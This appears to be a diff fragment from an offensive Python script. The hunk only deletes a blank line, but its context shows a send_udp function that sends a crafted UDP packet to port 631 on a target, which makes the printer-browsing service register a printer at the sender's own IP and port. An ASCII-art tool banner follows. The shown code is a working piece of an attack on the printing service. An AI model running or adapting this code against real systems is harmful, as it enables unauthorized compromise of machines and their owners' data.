@@ -64,7 +64,6 @@ def send_udp(target_ip,tcp_port):
     udp_callback = f'0 3 http://{src_ip}:{tcp_port}/printers/LRLPrinter'.encode('utf-8')
     udp_socket.sendto(udp_callback, (target_ip, 631))
 
-
 if __name__ == "__main__":
     try:
         print("\n░█▀▄░▀█▀░█▀▄░▀█▀░█░█░░░█▀▀░█░█░█▀█░█▀▀ ")
